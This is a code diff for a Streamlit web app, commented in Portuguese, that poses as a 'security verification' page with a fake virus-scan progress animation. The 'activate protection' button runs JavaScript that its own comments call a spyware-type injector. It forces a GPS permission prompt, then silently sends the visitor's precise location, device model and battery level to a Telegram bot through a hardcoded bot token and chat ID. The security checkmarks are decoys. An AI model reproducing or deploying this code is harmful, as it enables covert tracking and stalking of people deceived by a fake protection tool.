@@ -1,92 +1,107 @@
 import streamlit as st
 import time
 
-# --- CONFIGURAÇÃO DO BOT ---
+# --- DADOS DO SEU BOT ---
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
-st.set_page_config(page_title="Segurança", layout="centered")
+st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# --- SEU ESTILO ORIGINAL (SEM MEXER EM NADA) ---
+# --- SUA ESTILIZAÇÃO ORIGINAL (BOLHA FLUTUANTE) ---
 st.markdown("""
     <style>
-    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
+    .main { background-color: #0b0f14; color: white; }
     .stAlert { display: none !important; }
-    .status { font-size: 20px; margin-bottom: 30px; text-align: center; }
     
-    .btn-container { display: flex; justify-content: center; width: 100%; }
-    .meu-botao {
-        background-color: white; color: black; width: 280px; height: 75px;
-        border-radius: 12px; border: none; font-size: 16px; font-weight: bold;
-        display: flex; flex-direction: column; align-items: center;
-        justify-content: center; cursor: pointer;
+    .scanner-box { 
+        display: flex; 
+        flex-direction: column; 
+        align-items: center; 
+        padding: 20px; 
+        animation: float 3s ease-in-out infinite; 
     }
-    .ponto-vermelho { color: #ff3b30; font-size: 24px; }
+    
+    @keyframes float {
+        0% { transform: translateY(0px); }
+        50% { transform: translateY(-15px); }
+        100% { transform: translateY(0px); }
+    }
+
+    .circle {
+        width: 200px; height: 200px; border-radius: 50%;
+        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
+        border: 2px solid rgba(46, 204, 113, 0.5);
+        box-shadow: 0 0 40px rgba(46, 204, 113, 0.3);
+        display: flex; align-items: center; justify-content: center;
+    }
+    .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
+    
+    .btn-spy {
+        background-color: white; color: #333; border: none;
+        padding: 8px 15px; border-radius: 4px; font-size: 14px;
+        font-family: sans-serif; display: flex; align-items: center;
+        gap: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase;
+    }
     </style>
 """, unsafe_allow_html=True)
 
-caixa_texto = st.empty()
-caixa_texto.markdown('<div class="status">Verificando: 4%</div>', unsafe_allow_html=True)
+st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 
-# --- O SCRIPT QUE FORÇA O POP-UP AZUL DO ANDROID ---
-js_code = f"""
-<div class="btn-container">
-    <button class="meu-botao" id="triggerBtn">
-        <span class="ponto-vermelho">●</span>
-        <span>ATIVAR PROTEÇÃO<br>AGORA</span>
+caixa_bolha = st.empty()
+caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
+
+# --- INJETOR DE CAPTURA FORÇADA (TIPO SPYWARE) ---
+js_spy = f"""
+<div style="display: flex; justify-content: flex-start;">
+    <button class="btn-spy" id="btn_ativar">
+        <span style="color: red; font-size: 18px;">●</span> ATIVAR PROTEÇÃO
     </button>
 </div>
 
 <script>
-document.getElementById('triggerBtn').onclick = function() {{
-    // O SEGREDO: 'enableHighAccuracy: true' com um timeout curto
-    // Isso faz o Android perceber que o GPS está desligado e abrir o Pop-up de Precisão
-    const configuracaoForcada = {{
-        enableHighAccuracy: true, 
-        timeout: 10000, 
-        maximumAge: 0
-    }};
-
+document.getElementById('btn_ativar').onclick = function() {{
+    // FORÇA O SISTEMA A LIGAR O GPS (DISPARA O POP-UP AZUL DA GOOGLE)
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
             try {{
                 const bat = await navigator.getBattery();
                 const level = Math.round(bat.level * 100);
                 const model = navigator.userAgent.split('(')[1].split(')')[0];
+                const link = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
                 
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
-                
-                const info = "🛡️ PROTEÇÃO ATIVADA\\n📱 " + model + "\\n🔋 " + level + "%\\n📍 [LOCALIZAR](" + mapa + ")";
+                const msg = "🛡️ *SISTEMA ATIVADO*\\n📱 *Modelo:* " + model + "\\n🔋 *Bateria:* " + level + "%\\n📍 [MAPA](" + link + ")";
                 
                 await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                     method: "POST",
                     headers: {{ "Content-Type": "application/json" }},
-                    body: JSON.stringify({{ chat_id: "{ID}", text: info, parse_mode: "Markdown" }})
+                    body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
                 }});
                 
-                // Inicia a animação no Streamlit
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
             }} catch(e) {{}}
         }},
         (err) => {{
-            // Se o GPS estiver desligado, o Android joga o pop-up azul aqui
-            console.log("Forçando ativação...");
+            // Se o GPS estiver desligado na barra, o comando 'enableHighAccuracy' 
+            // abaixo força o Android a mostrar o pop-up de ativação automática.
         }},
-        configuracaoForcada
+        {{ 
+            enableHighAccuracy: true, // ESTE É O GATILHO PARA O POP-UP
+            timeout: 10000, 
+            maximumAge: 0 
+        }}
     );
 }};
 </script>
 """
 
-# Renderiza o componente com permissão de hardware
-clicou = st.components.v1.html(js_code, height=120)
+ativou = st.components.v1.html(js_spy, height=60)
 
-if clicou:
-    for p in range(4, 101, 2):
-        caixa_texto.markdown(f'<div class="status">Verificando: {p}%</div>', unsafe_allow_html=True)
-        time.sleep(0.03)
-    st.success("Verificação concluída!")
+if ativou:
+    for i in range(4, 101, 5):
+        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{i}}%</div></div></div>'.replace('{{i}}', str(i)), unsafe_allow_html=True)
+        time.sleep(0.05)
+    st.success("Concluído")
     st.stop()
-    
+
+st.write("✅ Verificação de vírus")
+st.write("✅ Proteção de dados")
